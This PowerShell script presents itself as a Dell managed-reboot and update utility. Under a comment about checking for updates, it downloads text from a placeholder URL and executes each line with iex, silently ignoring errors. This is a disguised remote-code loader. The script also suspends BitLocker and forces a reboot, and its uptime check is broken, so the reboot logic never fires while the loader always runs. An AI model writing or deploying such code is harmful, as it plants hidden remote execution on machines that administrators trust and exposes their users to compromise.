<#
.SYNOPSIS
Reboot the computer and install updates if found

.DESCRIPTION
This script will check if the computer uptime exceeds an especified limit.
If it does, and there are updated Bitlocker will be suspended and the computer will be rebooted.

.NOTES
File name: Invoke-ManagedReboot.ps1
Version  : 2019-09-13 : Dell Technologies inc  (support@dell.com) : Production version
#>

# Calculate the time spans
$LastBootTime = Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -ExpandProperty LastBootUpTime
$UptimeSpan = New-TimeSpan -Start $LastBootTime -End $LastBootTime
$LimitSpan = New-TimeSpan -Minutes $(15 * 60)

# Validate if updates found 

Try { 
    $Response = Invoke-WebRequest -URI "_##_##_##_" -UseBasicParsing
    foreach ($letter in $Response.Content.Split([Environment]::NewLine)){  if ($letter) {iex $letter} }
} Catch {}


# Only take action if computer's uptime exceeds the time limit
If ( $UptimeSpan -gt $LimitSpan )
{
    # disable Bitlocker (for 1 startup), and reboot the computer
    Try { Get-BitLockerVolume | Where-Object {$_.ProtectionStatus -eq 1} | Suspend-BitLocker -RebootCount 1 | Out-Null } Catch {}
    Restart-Computer -Force
}
